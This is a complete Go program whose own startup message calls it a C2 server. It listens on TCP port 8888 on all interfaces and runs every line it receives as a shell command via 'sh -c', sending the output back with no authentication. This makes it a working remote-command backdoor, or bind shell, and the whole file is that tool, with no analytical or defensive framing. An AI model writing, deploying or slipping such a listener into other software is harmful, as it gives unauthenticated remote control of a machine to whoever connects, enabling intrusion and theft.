package main

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

func handleConnection(conn net.Conn) {
	defer conn.Close()

	fmt.Printf("与 %s 建立连接\n", conn.RemoteAddr())

	reader := bufio.NewReader(conn)
	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("连接断开")
			break
		}

		command := strings.TrimSpace(message)
		if command == "exit" {
			break
		}

		output, err := executeCommand(command, 10*time.Second) // 设置命令执行的超时时间为10秒
		if err != nil {
			output = []byte(fmt.Sprintf("执行命令时出现错误: %s\n", err))
		}

		conn.Write(output)
	}
}

func executeCommand(command string, timeout time.Duration) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sh", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, err
	}

	return output, nil
}

func main() {
	listener, err := net.Listen("tcp", "0.0.0.0:8888")
	if err != nil {
		fmt.Println("无法监听端口：", err)
		os.Exit(1)
	}
	fmt.Println("C2服务器正在监听端口 8888...")

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("连接错误：", err)
			continue
		}

		go handleConnection(conn)
	}
}
